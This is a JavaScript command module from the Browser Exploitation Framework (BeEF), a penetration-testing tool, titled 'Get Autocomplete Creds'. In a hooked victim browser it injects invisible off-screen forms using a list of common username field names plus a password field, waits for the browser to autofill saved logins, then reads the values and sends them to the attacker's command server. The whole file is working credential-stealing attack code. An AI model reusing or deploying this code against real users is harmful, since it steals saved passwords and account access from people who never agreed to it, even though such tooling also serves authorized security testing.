//
// Copyright (c) 2006-2023Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

  get_form_data = function(form_name) {
    var f = document.getElementById(form_name);
    var results = '';
    for(i=0; i<f.elements.length; i++) {
      var k = f.elements[i].id;
      var v = f.elements[i].value;
      if (v != '') {
        results += k + '=' + v + '&';
      }
    }

    if (results == '') {
      beef.debug("[Get Autocomplete Creds] Found no autocomplete credentials");
      return;
    }

    beef.debug("[Get Autocomplete Creds] Found autocomplete data: '" + results + "'");
    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'results=' + results, beef.are.status_success());
  }

  create_form = function(input_name) {
    var f = document.createElement("form");
    f.setAttribute("id",    "get_autocomplete_" + input_name + "_<%= @command_id %>");
    f.setAttribute("style", "position:absolute;visibility:hidden;top:-1000px;left:-1000px;width:1px;height:1px;border:none;");

    var u_input = document.createElement('input');
    u_input.setAttribute("id",    input_name);
    u_input.setAttribute("name",  input_name);
    u_input.setAttribute("style", "position:absolute;visibility:hidden;top:-1000px;left:-1000px;width:1px;height:1px;border:none;");
    u_input.setAttribute("type",  "text");
    f.appendChild(u_input);

    var p_input = document.createElement('input');
    p_input.setAttribute("id",    "password");
    p_input.setAttribute("name",  "password");
    p_input.setAttribute("style", "position:absolute;visibility:hidden;top:-1000px;left:-1000px;width:1px;height:1px;border:none;");
    p_input.setAttribute("type",  "password");
    f.appendChild(p_input);

  	document.body.appendChild(f);
  }

  var inputs = [
    'user',
    'uname',
    'username',
    'user_name',
    'login',
    'loginname',
    'login_name',
    'email',
    'emailaddress',
    'email_address',
    'session[username_or_email]',
    'name'
  ];

  beef.debug("[Get Autocomplete Creds] Creating forms ...");

  for(i=0; i<inputs.length; i++) {
    var input_name = inputs[i];
    create_form(input_name);
    setTimeout("get_form_data('get_autocomplete_" + input_name + "_<%= @command_id %>'); document.body.removeChild(document.getElementById('get_autocomplete_" + input_name + "_<%= @command_id %>'));", 2000);
  }
});

